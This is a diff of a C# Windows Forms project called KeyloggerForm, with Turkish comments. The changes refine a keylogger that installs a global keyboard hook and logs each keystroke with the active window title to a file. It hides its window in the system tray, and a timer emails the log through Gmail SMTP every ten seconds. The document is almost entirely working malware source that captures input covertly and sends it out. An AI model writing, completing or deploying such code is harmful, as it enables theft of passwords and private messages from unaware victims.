@@ -10,44 +10,105 @@ namespace KeyloggerForm
 
     public partial class Form1 : Form
     {
-        private void MailGonder()
+        
+
+        // Dosyaya yazmak için StreamWriter
+        private static StreamWriter logWriter;
+
+        
+        public Form1()
+        {
+            InitializeComponent();
+            InitLogger(); // program baþlarken log dosyasýný aç
+        }
+
+        private static void InitLogger()
+        {
+            logWriter = new StreamWriter(
+                new FileStream(logPath, FileMode.Append, FileAccess.Write, FileShare.ReadWrite),
+                Encoding.UTF8
+            )
+            { AutoFlush = true };
+        }
+
+        private static void CloseLogger()
+        {
+            logWriter?.Dispose();
+        }
+
+        private static void WriteLog(string text)
+        {
+            if (logWriter == null) return; // güvenlik
+            logWriter.Write(text);
+        }
+        private void WriteLog(string fileName, string text)
         {
             try
             {
-                //Gonderici bilgileri
-                string gonderici = ""; //gönderici mail
-                string sifre = ""; // gonderici gmail uygulama þifresi
-                string alici = ""; //alýcý mail
-
-                MailMessage mail = new MailMessage();
-                mail.From = new MailAddress(gonderici);
-                mail.To.Add(alici);
-                mail.Subject = "Log Dosyasý";
-                mail.Body = "Merhaba, log dosyan ekte.";
-
-                string logDosyasi = Path.Combine(Application.StartupPath, "log.txt");
-                if (File.Exists(logDosyasi))
+                using (var sw = new StreamWriter(fileName, true, Encoding.UTF8))
                 {
-                    mail.Attachments.Add(new Attachment(logDosyasi));
+                    sw.WriteLine($"{DateTime.Now}: {text}");
                 }
-
-                using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
-                {
-                    smtp.Credentials = new NetworkCredential(gonderici, sifre);
-                    smtp.EnableSsl = true;
-                    smtp.Send(mail);
-                }
-
-                File.AppendAllText("mail_status.txt", DateTime.Now + " - Mail gönderildi.\n");
             }
-            catch(Exception ex)
+            catch (IOException)
             {
-                File.AppendAllText("error.txt", DateTime.Now + " - Hata: " + ex.Message + "\n");
-
-
+                // Dosya kilitliyse bekle ve tekrar dene
+                Thread.Sleep(100);
+                using (var sw = new StreamWriter(fileName, true, Encoding.UTF8))
+                {
+                    sw.WriteLine($"{DateTime.Now}: {text}");
+                }
             }
         }
-       
+
+
+
+
+        
+        private void MailGonder()
+        {
+            using (var client = new SmtpClient("smtp.gmail.com", 587))
+            {
+                client.Credentials = new NetworkCredential(
+                    "",
+                    ""); // Google uygulama þifresi
+                client.EnableSsl = true;
+
+                var mail = new MailMessage();
+                mail.From = new MailAddress("");
+                mail.To.Add("");
+                mail.Subject = "Keylogger Log " + DateTime.Now.ToString("HH:mm:ss");
+                mail.Body = "Log dosyasý ektedir.";
+
+                string logPath = @"C:\Users\Halil\source\repos\KeyloggerForm\KeyloggerForm\bin\Debug\net8.0-windows\keylog.txt";
+
+                try
+                {
+                    if (File.Exists(logPath))
+                    {
+                        // Dosyayý kilitlenmeden eklemek için FileStream kullan
+                        using (FileStream fs = new FileStream(logPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                        {
+                            Attachment attachment = new Attachment(fs, Path.GetFileName(logPath));
+                            mail.Attachments.Add(attachment);
+
+                            client.Send(mail); // SENKRON gönderim
+                        }
+                    }
+                    else
+                    {
+                        mail.Body += "\n\n(Not: Log dosyasý bulunamadý)";
+                        client.Send(mail);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show("Ek dosya eklenirken hata: " + ex.Message);
+                }
+            }
+        }
+
+
 
 
 
@@ -187,59 +248,47 @@ namespace KeyloggerForm
                 switch (key)
                 {
                     case Keys.Enter:
-                        // Satýrý dosyaya yaz ve tarih–saat ekle
-
-                        File.AppendAllText(logPath, Environment.NewLine);
                         string windowTitle = GetActiveWindowTitle();
-                        File.AppendAllText(logPath, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] ({windowTitle}) ");
+                        WriteLog(Environment.NewLine);
+                        WriteLog($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] ({windowTitle}) {currentLine}");
                         currentLine.Clear();
                         break;
 
                     case Keys.Space:
                         currentLine.Append(" ");
-                        File.AppendAllText(logPath, " "); // ?? boþluðu dosyaya da yaz
-
-
+                        WriteLog(" ");
                         break;
 
                     case Keys.Back:
                         if (currentLine.Length > 0)
                             currentLine.Remove(currentLine.Length - 1, 1);
-                        File.AppendAllText(logPath, "[BACKSPACE]");
+                        WriteLog("[BACKSPACE]");
                         break;
 
                     case Keys.Tab:
                         currentLine.Append("\t");
-                        File.AppendAllText(logPath, "[TAB]");
-
+                        WriteLog("[TAB]");
                         break;
 
                     default:
-                        //// Önce normal karakteri al
                         string karakter = GetCharFromKey(key, vkCode);
-
-                        //Eðer boþ döndüyse Türkçe eþlemeyi den
                         if (string.IsNullOrEmpty(karakter))
-                        {
                             karakter = GetTurkishChar(vkCode);
-                        }
 
                         currentLine.Append(karakter);
-
-                        File.AppendAllText(logPath, karakter);
-
+                        WriteLog(karakter);
                         break;
                 }
             }
 
             return CallNextHookEx(hookID, nCode, wParam, lParam);
         }
-        // Türkçe karakter eþlemeleri
+
         private static string GetTurkishChar(int vkCode)
         {
             switch (vkCode)
             {
-                case 0xDB: return "Ð"; // Örnek: Türkçe Q klavye için
+                case 0xDB: return "Ð";
                 case 0xDC: return "Ü";
                 case 0xBA: return "Þ";
                 case 0xC0: return "Ý";
@@ -254,10 +303,9 @@ namespace KeyloggerForm
                 case 0x9F: return "ö";
 
                 default: return "";
-
-
             }
         }
+
         // Gerekli DLL importlarý
         [DllImport("user32.dll")]
         private static extern IntPtr GetForegroundWindow();
@@ -309,13 +357,14 @@ namespace KeyloggerForm
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
-        public Form1()
-        {
-            InitializeComponent();
-        }
+        
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            // Uygulama açýlýþýnda timer çalýþsýn
+            timer1.Interval = 10000;
+            timer1.Start();
+
             hookID = SetHook(proc);
 
             //formu gizle
@@ -339,27 +388,31 @@ namespace KeyloggerForm
             trayIcon.ContextMenuStrip = trayMenu; //baðlama burada!
             trayIcon.Visible = true;
 
-            // Uygulama açýlýþýnda timer çalýþsýn
-            timerMail.Start();
+           
 
 
 
         }
 
-        private void timerMail_Tick(object sender, EventArgs e)
+        private void timer1_Tick(object sender, EventArgs e)
         {
-            // Çakýþmayý önlemek için timer’ý durdurup iþlem bitince yeniden baþlatacaðýz
-    timerMail.Stop();
+            timer1.Stop(); // Çakýþmayý önle
             try
             {
-                MailGonder();
+                MailGonder(); // Senkron çaðrý
+                
+
+            }
+            catch (Exception ex)
+            {
+                WriteLog("error.log", ex.ToString());
             }
             finally
             {
-                // Ýþlem bittiðinde yeniden baþlat
-                timerMail.Start();
+                timer1.Start(); // Ýþlem bitince tekrar baþlat
             }
-
         }
+
+
     }
 }
